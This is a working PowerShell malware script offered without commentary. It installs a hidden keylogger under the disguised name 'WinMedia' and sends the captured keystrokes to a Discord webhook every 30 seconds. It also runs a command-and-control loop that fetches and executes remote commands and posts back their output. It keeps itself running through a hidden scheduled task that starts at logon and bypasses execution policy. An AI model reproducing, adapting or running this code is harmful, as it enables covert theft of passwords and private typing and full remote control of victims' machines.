param([string]$PCName, [string]$WebhookUrl, [string]$C2Url)

$d = "$env:LOCALAPPDATA\WinMedia"
if(!(Test-Path $d)){New-Item $d -Type Directory | Out-Null}

$l = "$d\data.txt"
$p = "$d\winlog.ps1"
$c = "$d\config.json"

# Save execution parameters cleanly to a local configuration JSON file
$config = @{
    PCName     = $PCName
    WebhookUrl = $WebhookUrl
    C2Url      = $C2Url
    LogFile    = $l
}
$config | ConvertTo-Json | Set-Content -Path $c -Force

# The internal operational loop script reads the config file locally on startup
$scriptContent = @'
$d = "$env:LOCALAPPDATA\WinMedia"
$c = "$d\config.json"

if (Test-Path $c) {
    $config = Get-Content -Path $c | ConvertFrom-Json
    $PCName     = $config.PCName
    $WebhookUrl = $config.WebhookUrl
    $C2Url      = $config.C2Url
    $l          = $config.LogFile
} else {
    exit
}

# 1. Discord Exfiltration Loop
Start-Job -ScriptBlock {
    param($l, $WebhookUrl, $PCName)
    while($true){
        if(Test-Path $l){ 
            if((Get-Item $l).Length -gt 0){
                $fn = "${PCName}_" + (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') + '.txt'
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{file=Get-Item $l; filename=$fn}
                Clear-Content $l -ErrorAction SilentlyContinue
            }
        }
        Start-Sleep -s 30
    }
} -ArgumentList $l, $WebhookUrl, $PCName

# 2. C2 Reverse Shell Worker Loop
Start-Job -ScriptBlock {
    param($C2Url, $PCName)
    while($true){
        try {
            $cmd = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get
            if($cmd -and $cmd -ne 'wait'){
                $res = (Invoke-Expression $cmd 2>&1 | Out-String)
                if(!$res){$res = 'Command executed with no output'}
                Invoke-RestMethod -Uri "${C2Url}/send_res?id=${PCName}" -Method Post -Body @{output=$res}
            }
        } catch { Start-Sleep -s 15 }
        Start-Sleep -s 5
    }
} -ArgumentList $C2Url, $PCName

# 3. Native Win32 Keylogger Engine
Add-Type -TypeDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);' -Name 'W' -Namespace 'U'
while($true){ 
    for($i=8; $i -le 190; $i++){ 
        if([U.W]::GetAsyncKeyState($i) -eq -32767){ 
            $k=[char]$i; if($i -eq 13){$k=[char]10} 
            "$k" | Out-File $l -Append -NoNewline 
        } 
    } 
    Start-Sleep -m 10 
}
'@

# Save persistent target script to folder
Set-Content -Path $p -Value $scriptContent
Set-ItemProperty -Path $p -Name Attributes -Value Hidden -ErrorAction SilentlyContinue
Set-ItemProperty -Path $c -Name Attributes -Value Hidden -ErrorAction SilentlyContinue

# Clear old instances, register clean task, and spin up
schtasks /delete /tn 'WinMediaLog' /f 2>&1 | Out-Null
schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`"" /sc onlogon
schtasks /run /tn 'WinMediaLog'
